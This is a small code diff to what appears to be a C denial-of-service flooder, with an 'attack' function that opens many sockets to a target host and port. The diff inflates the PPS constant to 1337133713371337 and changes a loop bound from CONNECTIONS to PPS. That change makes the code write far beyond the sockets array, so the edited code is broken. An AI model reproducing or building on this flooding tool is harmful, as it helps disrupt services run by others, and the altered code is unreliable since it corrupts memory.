@@ -10,7 +10,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define PPS 900000000
+#define PPS 1337133713371337
 
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
@@ -56,7 +56,7 @@ int bytes = 1337133713371337;
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
-	for(x=0; x < CONNECTIONS; x++)
+	for(x=0; x < PPS; x++)
 		sockets[x]=0;
 	
 	while(x < PPS) {
